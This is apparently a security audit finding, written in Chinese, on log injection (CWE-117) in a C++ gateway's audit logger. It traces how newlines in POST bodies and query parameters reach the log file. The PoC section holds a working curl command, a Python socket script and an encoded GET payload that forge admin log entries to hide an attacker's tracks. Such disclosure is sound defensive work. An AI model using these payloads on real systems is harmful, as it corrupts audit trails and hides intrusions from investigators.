# VULN-DF-AUDIT-001: 审计日志函数未过滤换行符，攻击者可通过 POST 请求体注入伪造日志条目

**严重性**: High | **CWE**: CWE-117 (Improper Output Neutralization for Logs) | **置信度**: 85/100
**位置**: `include/audit_log.hpp:11-14` @ `AuditLog::event`

---

## 1. 漏洞细节

`AuditLog::event()` 函数将三个参数（`user`、`action`、`detail`）直接通过 `std::ofstream` 写入审计日志文件，未对任何参数进行换行符（`\n`、`\r`）或控制字符的过滤与转义。日志格式为单行结构化记录：

```
<timestamp> user=<user> action=<action> detail=<detail>\n
```

由于 `detail` 参数（以及 `user` 参数）可包含攻击者控制的任意字符，攻击者可在参数中嵌入换行符 `\n`，使后续内容被日志解析器视为独立的新日志条目。这使得攻击者能够：

1. **伪造审计日志条目**：在注入的换行符后写入格式一致的虚假日志记录，制造误导性取证证据
2. **掩盖攻击痕迹**：通过在合法日志条目中注入大量垃圾行，使安全分析人员难以定位真实攻击行为
3. **破坏取证完整性**：审计日志作为安全事件调查的关键证据源，被注入后其可信度完全丧失

最高风险攻击向量是 `POST /login` 路由中的 `request.body`（HTTP POST 请求体），该数据从网络套接字接收后原样传递至 `audit.event()` 的 `detail` 参数，全程无任何清洗操作。此外，其他 3 个路由也通过查询参数传递用户可控数据到 `audit.event()`，同样存在注入风险。

## 2. 漏洞代码

**文件**: `include/audit_log.hpp` (行 11-15)

```cpp
void event(const std::string& user, const std::string& action, const std::string& detail) {
    out_ << std::time(nullptr) << " user=" << user       // ← user 未过滤
         << " action=" << action                           // ← action 为硬编码，安全
         << " detail=" << detail << "\n";                  // ← detail 未过滤（漏洞根因）
}
```

**漏洞根因分析**：

- **第 12 行**：`user` 参数直接写入流，若 `user` 包含 `\n`，可触发日志注入
- **第 14 行**：`detail` 参数直接写入流，这是最高风险参数，因为 POST 请求体可包含任意长度的任意字符
- **缺失的防护措施**：整个函数未调用任何字符替换（如 `replace`、`erase`）、编码（如 URL 编码、Base64）或验证函数。`\n` 字符会原样写入日志文件，打破单行日志格式

**调用点代码** (`src/main.cpp` 行 40-52)：

```cpp
server.route("POST", "/login", [&](const HttpRequest& request) {
    std::string username = queryValue(request, "user");
    std::string password = queryValue(request, "password");
    audit.event(username, "login-attempt", request.body);  // ← 行 43: 污点数据直达
    // ...
});
```

- **行 43**：`request.body` 是 POST 请求体，从网络套接字原样读取，直接作为 `detail` 参数传入，无任何预处理

**数据提取代码** (`src/http_server.cpp` 行 65-67)：

```cpp
std::ostringstream body;
body << stream.rdbuf();         // ← 读取流中所有剩余字节，保留换行符
request.body = body.str();
```

- `stream.rdbuf()` 将 HTTP 请求头之后的所有原始字节（包括换行符）完整复制到 `body` 字符串中

## 3. 完整攻击链路

```
[入口点] recv()@src/http_server.cpp:113
  ↓ 从网络套接字读取原始 HTTP 请求数据（最多 4095 字节），存入 buffer
[解析] parseRequest()@src/http_server.cpp:42
  ↓ 解析 HTTP 请求，通过 stream.rdbuf() 提取 body（行 66），保留所有字符包括 \n
[路由分发] handlers_.find()@src/http_server.cpp:120
  ↓ 匹配 "POST /login" 路由，调用对应 handler（行 127）
[路由处理器] lambda(POST /login)@src/main.cpp:40
  ↓ 提取 username（行 41）和 request.body（行 43），无清洗操作
[漏洞触发] AuditLog::event()@include/audit_log.hpp:11
  ↓ user、detail 参数直接写入 ofstream（行 12-14），无 \n 转义
[最终 Sink] out_ << detail << "\n"@include/audit_log.hpp:14
  攻击者注入的 \n 导致日志文件产生伪造条目
```

### 链路逐步验证

**步骤 1 — 网络输入（Source）**：`http_server.cpp:113` 中 `recv(client, buffer, sizeof(buffer) - 1, 0)` 从已建立的 TCP 连接读取原始字节。数据完全来自外部攻击者，无任何过滤。

**步骤 2 — HTTP 解析**：`http_server.cpp:42-68` 中 `parseRequest()` 将原始字节解析为 `HttpRequest` 结构体。关键点在行 65-67：`body << stream.rdbuf()` 将请求头之后的所有剩余数据原样提取为 `request.body`。`std::string` 类型可包含嵌入的 `\n` 字符，不会被截断或转义。

**步骤 3 — 路由匹配**：`http_server.cpp:120` 通过 `routeKey("POST", "/login")` 查找已注册的处理器。`main.cpp:40` 已注册该路由，匹配成功后在行 127 调用 handler。

**步骤 4 — 路由处理器执行**：`main.cpp:43` 中 `audit.event(username, "login-attempt", request.body)` 是处理器内的**第一条语句**，无条件执行，无任何前置检查或守卫条件。`request.body` 直接作为 `detail` 参数传递。

**步骤 5 — 日志写入（Sink）**：`audit_log.hpp:12-14` 中 `out_ << detail << "\n"` 将 `detail` 内容写入日志文件。若 `detail` 包含 `\n`，则 `\n` 后的内容在日志文件中表现为新的一行，与合法日志条目格式无法区分。

## 4. 攻击场景

**攻击者画像**: 远程未认证用户。攻击者仅需能够向目标服务器发送 TCP 连接和 HTTP 请求，无需任何认证凭据或特殊权限。`POST /login` 路由在认证检查（行 45）之前就已调用 `audit.event()`（行 43），因此即使认证失败，日志注入仍然成功执行。

**攻击向量**: 通过 HTTP POST 请求向 `/login` 端点发送包含换行符的请求体。也可通过 GET 请求的查询参数（`/files?name=`、`/debug/ping?host=`、`/admin/export?token=`）注入，但 POST body 是最直接且容量最大的攻击向量。

**利用难度**: **低**。攻击者仅需构造一个标准 HTTP 请求，在请求体中嵌入换行符即可。无需特殊工具、无需绕过认证、无需利用内存损坏。

### 攻击步骤

1. **建立 TCP 连接**：向目标服务器的 HTTP 端口（默认 8080）建立 TCP 连接
2. **构造恶意 HTTP 请求**：发送 `POST /login?user=attacker&password=x` 请求，请求体中包含注入的换行符和伪造日志条目
3. **触发漏洞**：服务器接收请求后，`audit.event()` 将包含 `\n` 的请求体原样写入审计日志文件
4. **验证注入结果**：读取 `edge-gateway.audit.log` 文件，确认伪造条目已成功注入

### 补充攻击向量

除 `POST /login` 外，以下路由同样可被利用：

| 路由 | 注入参数 | 传递位置 |
|------|---------|---------|
| `GET /files?name=<payload>` | `name` 查询参数 | `main.cpp:56` — `audit.event("anonymous", "read-file", name)` |
| `POST /debug/ping?host=<payload>` | `host` 查询参数 | `main.cpp:66` — `audit.event("operator", "debug-ping", host)` |
| `GET /admin/export?token=<payload>` | `token` 查询参数 | `main.cpp:72` — `audit.event("admin", "export", token)` |
| `POST /login?user=<payload>` | `user` 查询参数 | `main.cpp:43` — `audit.event(username, ...)` 的 `user` 参数 |

## 5. 攻击条件

| 条件类型 | 要求 | 说明 |
|----------|------|------|
| 网络可达性 | 需要能访问目标 HTTP 端口 | 服务器默认监听 8080 端口（`main.cpp:28`），绑定 `INADDR_ANY`（`http_server.cpp:92`），接受所有网络接口的连接 |
| 认证要求 | 无需认证 | `POST /login` 路由在认证检查（行 45）之前执行 `audit.event()`（行 43），注入无需有效凭据 |
| 配置依赖 | 无特殊配置要求 | 审计日志在 `main.cpp:33` 无条件初始化，所有路由无条件注册 |
| 环境依赖 | 标准 C++ 运行环境 | 无特殊编译选项或运行时环境依赖，任何支持 POSIX socket 的 Linux 系统均可 |
| 时序条件 | 无 | 漏洞利用不涉及竞态条件，单次请求即可触发 |

## 6. 造成影响

| 影响维度 | 等级 | 说明 |
|----------|------|------|
| 机密性 | 低 | 日志注入本身不直接泄露数据，但伪造的日志条目可误导安全调查方向，间接保护攻击者的其他恶意活动 |
| 完整性 | **高** | 审计日志的完整性被完全破坏。攻击者可注入任意数量的伪造日志条目，使日志文件丧失作为取证证据的可信度 |
| 可用性 | 中 | 大量注入的日志条目可能填满磁盘空间或使日志分析工具过载，间接影响安全运维团队的响应能力 |

**影响范围**: 审计日志文件 `edge-gateway.audit.log`（`main.cpp:33`）的完整性被破坏。如果该日志文件被 SIEM 系统、安全审计工具或合规性检查流程消费，则影响可扩展到下游安全监控和合规报告系统。攻击者还可利用日志注入掩盖同一系统上的其他攻击行为（如命令注入 VULN-SEC-CMDI-001、路径遍历等），形成攻击链。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用，请勿用于非法目的

### PoC 1: 使用 curl 注入伪造审计日志条目

```bash
# 仅供安全测试使用 - 通过 POST body 注入伪造日志条目
curl -X POST "http://TARGET:8080/login?user=test&password=wrong" \
  -d 'normal-body
1700000000 user=admin action=admin-delete detail=covered_tracks
1700000001 user=admin action=config-change detail=disabled_logging'
```

### PoC 2: 使用 Python 脚本进行精确注入

```python
#!/usr/bin/env python3
"""仅供安全测试使用 - 审计日志注入 PoC"""
import socket
import sys

def inject_log_entry(target_host, target_port=8080):
    # 构造包含注入换行符的 POST body
    fake_timestamp = "1700000000"
    forged_entries = (
        f"\n{fake_timestamp} user=admin action=admin-grant "
        f"detail=granted_root_access_to_attacker"
        f"\n{fake_timestamp} user=admin action=audit-disable "
        f"detail=disabled_audit_logging"
    )

    body = f"innocent-data{forged_entries}"

    # 构造原始 HTTP 请求
    request = (
        f"POST /login?user=attacker&password=test HTTP/1.1\r\n"
        f"Host: {target_host}:{target_port}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"\r\n"
        f"{body}"
    )

    # 发送请求
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_host, target_port))
    sock.sendall(request.encode())
    response = sock.recv(4096).decode()
    sock.close()

    print(f"[*] 请求已发送，服务器响应:\n{response}")
    print(f"[*] 请检查 edge-gateway.audit.log 文件确认注入结果")

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    inject_log_entry(host)
```

### PoC 3: 通过查询参数注入（GET /files 路由）

```bash
# 仅供安全测试使用 - 通过 URL 查询参数注入（需要 URL 编码换行符）
curl "http://TARGET:8080/files?name=test%0a1700000000%20user%3Dadmin%20action%3Ddelete%20detail%3Dforged"
```

**使用说明**:

1. 将 `TARGET` 替换为目标服务器 IP 地址
2. 执行 PoC 脚本向服务器发送包含注入内容的请求
3. 在服务器上检查 `edge-gateway.audit.log` 文件内容
4. 确认注入的伪造条目是否以独立行的形式出现在日志中

**预期结果**:

审计日志文件 `edge-gateway.audit.log` 中将出现如下内容：

```
1718690400 user=attacker action=login-attempt detail=innocent-data
1700000000 user=admin action=admin-grant detail=granted_root_access_to_attacker
1700000000 user=admin action=audit-disable detail=disabled_audit_logging
```

其中第 1 行是合法日志条目，第 2-3 行是攻击者注入的伪造条目。伪造条目与合法条目格式完全一致，仅通过时间戳和内容分析才能识别。

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux（Ubuntu 20.04+、Debian 11+ 或任何支持 POSIX socket 的发行版）
- 编译器: GCC 9+ 或 Clang 10+（需支持 C++17 标准）
- 依赖: 标准 C++ 库（libstdc++ 或 libc++），无第三方依赖
- 工具: curl（用于发送测试请求）、文本编辑器（用于检查日志文件）

### 构建步骤

```bash
# 在项目根目录下编译
cd /scan/project
g++ -std=c++17 -o edge-gateway src/main.cpp src/http_server.cpp \
    -I include -lpthread

# 或使用 CMake（如项目提供 CMakeLists.txt）
mkdir -p build && cd build
cmake .. && make
```

### 运行配置

```bash
# 启动服务器（默认监听 8080 端口）
./edge-gateway 8080

# 服务器将创建审计日志文件 edge-gateway.audit.log
```

无需额外配置文件或环境变量。服务器启动后自动创建 `edge-gateway.audit.log` 文件（以 append 模式打开）。

### 验证步骤

1. **启动服务器**：执行 `./edge-gateway 8080`，确认输出 `edge-gateway listening on port 8080`
2. **发送正常请求**（基线对比）：
   ```bash
   curl -X POST "http://127.0.0.1:8080/login?user=alice&password=secret" -d "normal-body"
   ```
3. **查看日志基线**：
   ```bash
   cat edge-gateway.audit.log
   # 预期：单行日志条目，如 "1718690400 user=alice action=login-attempt detail=normal-body"
   ```
4. **发送注入请求**：
   ```bash
   curl -X POST "http://127.0.0.1:8080/login?user=attacker&password=x" \
     -d $'test\n1700000000 user=admin action=admin-delete detail=forged_entry'
   ```
5. **验证注入结果**：
   ```bash
   cat edge-gateway.audit.log
   # 预期：出现两条独立的行，第二行为伪造条目
   wc -l edge-gateway.audit.log
   # 预期：行数大于正常请求产生的行数
   ```

### 预期结果

- **正常请求**：审计日志中产生恰好 1 行记录
- **注入请求**：审计日志中产生 2 行（或更多）记录，其中注入的行与合法行格式一致
- **取证影响**：仅通过日志文件内容无法区分合法条目与注入条目（时间戳格式相同、字段结构相同）
- **服务器行为**：服务器正常返回 HTTP 401 响应（认证失败），不会崩溃或报错，攻击无痕迹
